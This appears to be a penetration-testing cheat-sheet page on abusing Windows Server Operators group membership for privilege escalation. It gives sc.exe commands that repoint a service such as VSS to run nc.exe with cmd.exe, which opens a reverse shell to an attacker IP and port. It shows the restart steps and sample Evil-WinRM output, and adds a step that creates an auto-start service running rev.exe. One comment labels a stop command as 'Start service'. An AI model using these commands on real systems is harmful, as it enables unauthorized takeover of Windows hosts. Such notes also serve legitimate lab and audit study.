---
title: "Server Operators"
date: 2024-7-13
tags: ["Server Operators", "Active Directory", "Windows", "Privilege Escalation", "Service", "Reverse Shell"]
---

### Abuse #1: Change service path

#### 1. Change service path

```console
# Assume nc.exe is uploaded
sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe config VSS binpath="C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443"
[SC] ChangeServiceConfig SUCCESS
```

#### 2. Restart service

```console
# Stop service
sc.exe stop <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.
```

```console
# Start service
sc.exe stop <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### Additional: Create service

```console
# Create a service
sc.exe create <NEW_SERVICE> binpath= C:\ProgramData\rev.exe start= auto
```

<small>*Note: there is a space after named arguments*</small>